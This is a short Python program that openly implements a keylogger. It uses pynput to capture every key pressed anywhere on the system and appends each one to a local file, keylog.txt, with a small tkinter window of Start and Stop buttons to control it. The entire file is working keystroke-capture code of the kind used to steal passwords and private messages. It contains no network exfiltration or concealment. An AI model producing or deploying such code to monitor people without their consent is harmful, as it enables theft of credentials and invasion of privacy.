import tkinter as tk
from pynput.keyboard import Listener


class Keylogger:
    def __init__(self):
        self.listener = None

    def log_key(self, key):
        key = str(key).replace("'", "")
        with open("keylog.txt", "a") as file:
            file.write(key + "\n")

    def start(self):
        self.listener = Listener(on_press=self.log_key)
        self.listener.start()

    def stop(self):
        if self.listener is not None:
            self.listener.stop()
            self.listener = None


def create_gui(keylogger):
    root = tk.Tk()
    start_button = tk.Button(root, text="Start", command=keylogger.start)
    stop_button = tk.Button(root, text="Stop", command=keylogger.stop)
    start_button.pack()
    stop_button.pack()
    root.mainloop()


keylogger = Keylogger()
create_gui(keylogger)
